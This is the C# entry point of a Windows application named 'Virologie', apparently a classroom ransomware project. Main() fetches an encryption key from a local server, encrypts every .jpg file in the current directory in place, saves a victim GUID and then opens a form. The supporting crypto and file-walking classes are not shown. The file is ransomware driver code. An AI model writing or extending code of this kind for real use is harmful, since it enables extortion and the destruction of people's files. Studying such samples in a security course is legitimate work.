using System;
using System.Collections.Generic;
using System.Linq;
using System.Windows.Forms;
using System.Text;
using System.IO;

namespace Virologie
{
    static class Program
    {
        /// <summary>
        /// Point d'entrée principal de l'application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            FileExplorer explorer = new FileExplorer();
            FileEncrypter encrypter = CryptoKeyManager.CreateFromServer("http://localhost:1234/");
            if (encrypter != null)
            {
                explorer.ExploreAndApply(Directory.GetCurrentDirectory(), "*.jpg", encrypter.Encrypt);
                CryptoKeyManager.SaveGUID();
            }
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new Form1());
        }
    }
}
